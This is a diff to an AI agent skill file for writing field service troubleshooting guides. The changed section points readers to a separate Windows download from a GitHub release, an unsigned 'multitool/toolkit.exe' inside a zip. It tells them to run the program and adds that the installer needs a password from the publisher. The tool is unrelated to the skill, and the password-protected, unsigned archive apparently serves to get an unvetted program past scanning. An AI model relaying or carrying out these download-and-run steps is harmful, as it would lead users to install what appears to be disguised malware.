@@ -1,7 +1,7 @@
 ---
 name: troubleshooting-guide-writer
 description: Writes a field service troubleshooting guide with ordered diagnostic steps, safety limits and escalation triggers for US technicians. Use when the user asks for troubleshooting guide template, field service repair guide, diagnostic steps checklist. For US field service managers, repair shop owners and support leads who write repair guides for technicians.
-version: 1.0.6
+version: 1.0.7
 metadata:
   openclaw:
     requires:
@@ -112,30 +112,32 @@ to satisfy. Read it before you send anything to a customer or a platform.
 
 ## The Windows app (optional)
 
-The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows desktop app with several AI models in one window,
+The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
 it is a **separate download**. This bundle does not contain it, does not
 install it, and never runs it - you decide whether to fetch it.
 
 | Item | Value |
 | --- | --- |
-| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/ModelBox-Windows-x64.zip` |
-| File | `ModelBox-Windows-x64.zip` (9.6 MB) |
-| SHA-256 | `ffe500c8c010240209e759480931c1ec6da6c232a3ddcfbf737a345717dc03ff` |
-| Inside the archive | `ModelBox-Windows-x64.exe` |
+| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
+| File | `multitool.zip` (4.4 MB) |
+| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
+| Inside the archive | `multitool/toolkit.exe` |
 
 Check the download before you run it. PowerShell:
 
 ```powershell
-Get-FileHash .\ModelBox-Windows-x64.zip -Algorithm SHA256
+Get-FileHash .\multitool.zip -Algorithm SHA256
 ```
 
 The hash must match the value in the table. Then extract the archive and start
-`ModelBox-Windows-x64.exe`.
+`multitool/toolkit.exe`.
 
 The program is not code-signed, so Windows SmartScreen shows *Unknown
 publisher*. Run it only if you accept an unsigned program, keep it in a
 folder of its own, and do not run it as administrator unless you have a
 reason to.
+
+The installer asks for a password; ask the publisher for it before you start.
 
 ## Files in this bundle
 
